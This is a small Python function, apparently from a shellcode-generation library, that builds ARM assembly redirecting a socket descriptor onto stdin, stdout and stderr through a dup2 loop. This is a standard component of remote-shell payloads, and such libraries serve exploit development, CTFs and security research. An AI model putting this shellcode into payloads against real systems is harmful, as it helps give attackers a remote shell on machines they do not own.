# dup() in ARM Mode
def generate(sock=4):
    """Duplicates sock to stdin, stdout and stderr

    Args:
        sock(int/str/reg): sock descriptor
    """

    sc = ''
    try:
        xsock = int(sock)
        sc += 'mov r9, #%s' % (xsock)
    except:
        sc += 'mov r9, %s' % (sock)

    sc += """
    mov r8, #2
loop_2:
    mov r0, r9
    mov r1, r8
    #svc (0x900000+ 63)
    movw r7, #63
    svc 0
    adds r8, #-1
bpl loop_2
    """

    return sc
